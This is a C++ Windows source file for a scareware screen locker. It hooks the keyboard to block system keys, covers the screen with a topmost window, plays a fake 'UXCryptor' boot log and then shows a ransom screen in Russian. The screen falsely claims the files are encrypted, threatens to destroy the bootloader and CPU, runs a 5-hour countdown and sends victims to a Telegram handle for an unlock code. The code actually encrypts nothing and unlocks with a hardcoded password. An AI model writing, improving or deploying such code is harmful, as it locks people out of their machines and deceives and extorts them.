#include <windows.h>
#include <string>
#include <vector>

const std::wstring PASSWORD = L"29042011";
std::wstring input_text = L"";
bool is_bsod = false;
DWORD start_time = 0;
int time_left = 5 * 60 * 60;
DWORD last_timer_tick = 0;
bool show_error = false;
DWORD error_time = 0;
std::wstring pc_name = L"DESKTOP-12345";

// Текст для анимации
std::wstring full_log_text = 
    L"Booting Windows ...\n"
    L"Boot error: 0x03527737\n"
    L"Boot error: 0x0266712\n"
    L"Boot error: 0x02897593\n"
    L"Boot error: 0x01447812\n"
    L"Boot error: 0x0150974\n"
    L"Boot error: 0x03873700\n"
    L"Boot error: 0x0700882\n"
    L"Boot error: 0x03803618\n"
    L"Memory section at address 0x0424* is locked!\n"
    L"Service UXCryptor started.\n\n"
    L"* windows blocked!";
size_t typed_chars = 0;

HHOOK hKeyboardHook;
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        if (p->vkCode == VK_LWIN || p->vkCode == VK_RWIN || p->vkCode == VK_TAB || p->vkCode == VK_ESCAPE) return 1;
        if (GetAsyncKeyState(VK_MENU) & 0x8000) return 1; 
        if (GetAsyncKeyState(VK_CONTROL) & 0x8000) return 1; 
        if (p->vkCode == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1; 
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
    case WM_CREATE:
        hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
        // Ускоряем таймер (15 мс)
        SetTimer(hwnd, 1, 15, NULL); 
        {
            wchar_t buf[256];
            DWORD size = 256;
            GetComputerNameW(buf, &size);
            pc_name = buf;
        }
        start_time = GetTickCount();
        last_timer_tick = GetTickCount();
        return 0;

    case WM_TIMER:
        // Быстрая печать (по 2 символа за тик)
        if (!is_bsod && typed_chars < full_log_text.length()) {
            typed_chars += 2; 
            if (typed_chars > full_log_text.length()) typed_chars = full_log_text.length();
            InvalidateRect(hwnd, NULL, TRUE);
        }
        if (!is_bsod && GetTickCount() - start_time > 5000) {
            is_bsod = true;
            InvalidateRect(hwnd, NULL, TRUE);
        }
        if (is_bsod && GetTickCount() - last_timer_tick >= 1000) {
            if (time_left > 0) time_left--;
            last_timer_tick = GetTickCount();
            InvalidateRect(hwnd, NULL, TRUE);
        }
        if (show_error && GetTickCount() - error_time > 3000) {
            show_error = false;
            InvalidateRect(hwnd, NULL, TRUE);
        }
        return 0;

    case WM_CHAR:
        if (is_bsod) {
            if (wp == VK_BACK) {
                if (!input_text.empty()) input_text.pop_back();
            } else if (wp == VK_RETURN) {
                if (input_text == PASSWORD) {
                    PostQuitMessage(0);
                } else {
                    input_text.clear();
                    show_error = true;
                    error_time = GetTickCount();
                }
            } else if (wp >= 32 && wp <= 126 && input_text.length() < 15) {
                input_text += (wchar_t)wp;
            }
            InvalidateRect(hwnd, NULL, TRUE);
        }
        return 0;

    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        RECT rect;
        GetClientRect(hwnd, &rect);
        int cx = rect.right / 2;
        int cy = rect.bottom / 2;
        
        if (!is_bsod) {
            // --- СЦЕНА 1 ---
            FillRect(hdc, &rect, (HBRUSH)GetStockObject(BLACK_BRUSH));
            SetBkMode(hdc, TRANSPARENT);
            
            HFONT fontSmall = CreateFontW(20, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
            SelectObject(hdc, fontSmall);
            
            SetTextColor(hdc, RGB(255, 0, 0));
            std::wstring current_text = full_log_text.substr(0, typed_chars);
            if (typed_chars < full_log_text.length() || (GetTickCount() / 300) % 2 == 0) {
                current_text += L"_";
            }
            
            // ЖЕСТКО В ЛЕВОМ ВЕРХНЕМ УГЛУ
            RECT errRect = {10, 10, 800, 600};
            DrawTextW(hdc, current_text.c_str(), -1, &errRect, DT_LEFT | DT_WORDBREAK);
            
            // Глаз (используем большой юникод-символ глаза, по центру)
            HFONT fontEye = CreateFontW(120, 0, 0, 0, FW_NORMAL, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Segoe UI Symbol");
            SelectObject(hdc, fontEye);
            SetTextColor(hdc, RGB(255, 255, 255));
            RECT eyeRect = {cx - 200, cy - 100, cx + 200, cy + 100};
            DrawTextW(hdc, L"\U0001F441", -1, &eyeRect, DT_CENTER | DT_VCENTER);
            
            // Текст "ВАС ЗАМЕТИЛИ"
            HFONT fontLarge = CreateFontW(40, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
            SelectObject(hdc, fontLarge);
            RECT titleRect = {cx - 300, cy + 80, cx + 300, cy + 150};
            DrawTextW(hdc, L"\u0412\u0410\u0421 \u0417\u0410\u041c\u0415\u0422\u0418\u041b\u0418", -1, &titleRect, DT_CENTER | DT_VCENTER);

            DeleteObject(fontSmall);
            DeleteObject(fontEye);
            DeleteObject(fontLarge);
        } else {
            // --- СЦЕНА 2: BSOD ---
            HBRUSH blueBrush = CreateSolidBrush(RGB(0, 0, 170));
            FillRect(hdc, &rect, blueBrush);
            DeleteObject(blueBrush);
            
            SetBkMode(hdc, TRANSPARENT);
            HFONT font = CreateFontW(24, 0, 0, 0, FW_NORMAL, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
            SelectObject(hdc, font);

            // Верхняя плашка (такая же ширина, как нижнее поле ввода - 1100)
            RECT whiteRect = {cx - 550, cy - 320, cx + 550, cy - 270};
            HBRUSH whiteBrush = CreateSolidBrush(RGB(255, 255, 255));
            FillRect(hdc, &whiteRect, whiteBrush);
            DeleteObject(whiteBrush);
            SetTextColor(hdc, RGB(0, 0, 0));
            DrawTextW(hdc, L"\u0412\u0430\u0448\u0438 \u0444\u0430\u0439\u043b\u044b \u0437\u0430\u0448\u0438\u0444\u0440\u043e\u0432\u0430\u043d\u044b!", -1, &whiteRect, DT_CENTER | DT_VCENTER);
            
            // Основной текст
            SetTextColor(hdc, RGB(255, 255, 255));
            RECT textRect = {cx - 550, cy - 200, cx + 550, cy + 50};
            const wchar_t* bsod_text = 
                L"\u0423\u043f\u0441! \u0412\u044b \u043f\u043e\u0434\u0432\u0435\u0440\u0433\u043b\u0438\u0441\u044c \u043c\u0430\u0441\u0448\u0442\u0430\u0431\u043d\u043e\u0439 \u0445\u0430\u043a\u0435\u0440\u0441\u043a\u043e\u0439 \u0430\u0442\u0430\u043a\u0435 \u0438 \u0442\u0435\u043f\u0435\u0440\u044c \u0412\u0430\u0448 \u043a\u043e\u043c\u043f\u044c\u044e\u0442\u0435\u0440\n"
                L"\u0437\u0430\u0431\u043b\u043e\u043a\u0438\u0440\u043e\u0432\u0430\u043d, \u0430 \u0432\u0441\u0435 \u0438\u043c\u0435\u044e\u0449\u0438\u0435\u0441\u044f \u0434\u0438\u0441\u043a\u0438 \u0438 \u0444\u0430\u0439\u043b\u044b \u043d\u0430 \u043d\u0438\u0445 \u0437\u0430\u0448\u0438\u0444\u0440\u043e\u0432\u0430\u043d\u044b \u0445\u0430\u043a\u0435\u0440\u0441\u043a\u043e\u0439\n"
                L"\u0433\u0440\u0443\u043f\u043f\u0438\u0440\u043e\u0432\u043a\u043e\u0439. \u041b\u044e\u0431\u044b\u0435 \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u044f, \u0441\u0432\u044f\u0437\u0430\u043d\u043d\u044b\u0435 \u0441 \u043f\u043e\u043f\u044b\u0442\u043a\u043e\u0439 \u043e\u0431\u043c\u0430\u043d\u0443\u0442\u044c \u0441\u0438\u0441\u0442\u0435\u043c\u0443,\n"
                L"\u043d\u0430\u043d\u0435\u0441\u0443\u0442 \u043d\u0435\u043f\u043e\u043f\u0440\u0430\u0432\u0438\u043c\u044b\u0439 \u0432\u0440\u0435\u0434 \u0432\u0430\u0448\u0435\u043c\u0443 \u043a\u043e\u043c\u043f\u044c\u044e\u0442\u0435\u0440\u0443 \u0438 \u043f\u0440\u0438\u0432\u0435\u0434\u0443\u0442 \u043a \u043f\u043e\u0442\u0435\u0440\u0435 \u0432\u0441\u0435\u0445\n"
                L"\u0432\u0430\u0436\u043d\u044b\u0445 \u0434\u0430\u043d\u043d\u044b\u0445 \u0431\u0435\u0437 \u0432\u043e\u0437\u043c\u043e\u0436\u043d\u043e\u0441\u0442\u0438 \u0432\u043e\u0441\u0441\u0442\u0430\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u044f.\n"
                L"\u0411\u043b\u043e\u043a\u0438\u0440\u043e\u0432\u043a\u0443 \u0433\u043b\u0430\u0432\u043d\u044b\u0439 \u0437\u0430\u0433\u0440\u0443\u0437\u0447\u0438\u043a \u043c\u0430\u0442\u0435\u0440\u0438\u043d\u043a\u0438 \u0431\u0443\u0434\u0435\u0442 \u0441\u043d\u0435\u0441\u0451\u043d, \u0431\u0443\u0434\u0435\u0442 \u043f\u043e\u0434\u0430\u043d\u0430\n"
                L"\u0440\u0435\u043a\u0443\u0440\u0441\u0438\u0432\u043d\u0430\u044f \u043d\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u043d\u0430 \u0432\u0430\u0448 \u043f\u0440\u043e\u0446\u0435\u0441\u0441\u043e\u0440, \u0447\u0442\u043e \u043f\u0440\u0438\u0432\u0435\u0434\u0435\u0442 \u043a \u0435\u0433\u043e \u043d\u0435\u0438\u0441\u043f\u0440\u0430\u0432\u043d\u043e\u0441\u0442\u0438.\n"
                L"\u0423 \u0432\u0430\u0441 \u0435\u0441\u0442\u044c 5 \u0447\u0430\u0441\u043e\u0432 \u0441 \u043c\u043e\u043c\u0435\u043d\u0442\u0430 \u0437\u0430\u043f\u0443\u0441\u043a\u0430 \u0447\u0442\u043e\u0431\u044b \u0432\u0432\u0435\u0441\u0442\u0438 \u043a\u043e\u0434,\n"
                L"\u0447\u0442\u043e \u0431\u044b \u043f\u043e\u043b\u0443\u0447\u0438\u0442\u044c \u043a\u043e\u0434, \u043d\u0430\u043f\u0438\u0448\u0438               @opka8       (Telegram)";
            
            DrawTextW(hdc, bsod_text, -1, &textRect, DT_LEFT | DT_WORDBREAK);
            
            // Поле ввода (1100 в ширину)
            RECT inputRect = {cx - 550, cy + 100, cx + 550, cy + 150};
            HBRUSH inputBrush = CreateSolidBrush(RGB(255, 255, 255));
            FillRect(hdc, &inputRect, inputBrush);
            DeleteObject(inputBrush);
            SetTextColor(hdc, RGB(0, 0, 0));
            
            std::wstring display = L"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043a\u043e\u0434 \u0440\u0430\u0437\u0431\u043b\u043e\u043a\u0438\u0440\u043e\u0432\u043a\u0438: " + input_text;
            DrawTextW(hdc, display.c_str(), -1, &inputRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);

            // Имя ПК и Таймер
            SetTextColor(hdc, RGB(255, 255, 255));
            RECT bottomRect = {50, rect.bottom - 150, 800, rect.bottom - 110};
            std::wstring bottom = L"Current PC: " + pc_name;
            DrawTextW(hdc, bottom.c_str(), -1, &bottomRect, DT_LEFT);
            
            int hrs = time_left / 3600;
            int mins = (time_left % 3600) / 60;
            int secs = time_left % 60;
            wchar_t timer_buf[100];
            swprintf_s(timer_buf, L"\u041e\u0421\u0422\u0410\u041b\u041e\u0421\u042c \u0412\u0420\u0415\u041c\u0415\u041d\u0418: %02d:%02d:%02d", hrs, mins, secs);
            
            HFONT fontTimer = CreateFontW(36, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
            SelectObject(hdc, fontTimer);
            SetTextColor(hdc, RGB(0, 255, 0));
            RECT timerRect = {50, rect.bottom - 100, 800, rect.bottom - 40};
            DrawTextW(hdc, timer_buf, -1, &timerRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);

            // Окно ошибки
            if (show_error) {
                RECT errRect = {cx - 300, cy - 60, cx + 300, cy + 60};
                HBRUSH redBrush = CreateSolidBrush(RGB(204, 0, 0));
                FillRect(hdc, &errRect, redBrush);
                DeleteObject(redBrush);
                SetTextColor(hdc, RGB(255, 255, 255));
                DrawTextW(hdc, L"\u0417\u0430\u043c\u0435\u0447\u0435\u043d\u0430 \u0438 \u043e\u0441\u0442\u0430\u043d\u043e\u0432\u043b\u0435\u043d\u0430 \u043f\u043e\u043f\u044b\u0442\u043a\u0430\n\u043e\u0431\u043c\u0430\u043d\u0443\u0442\u044c \u0441\u0438\u0441\u0442\u0435\u043c\u0443!", -1, &errRect, DT_CENTER | DT_VCENTER);
            }
            DeleteObject(font);
            DeleteObject(fontTimer);
        }
        EndPaint(hwnd, &ps);
        return 0;
    }
    case WM_DESTROY:
        UnhookWindowsHookEx(hKeyboardHook);
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(hwnd, msg, wp, lp);
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
    WNDCLASSW wc = {0};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInst;
    wc.lpszClassName = L"LockerClass";
    RegisterClassW(&wc);
    HWND hwnd = CreateWindowExW(WS_EX_TOPMOST, L"LockerClass", L"System", WS_POPUP, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), NULL, NULL, hInst, NULL);
    ShowWindow(hwnd, SW_SHOW);
    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    return 0;
}
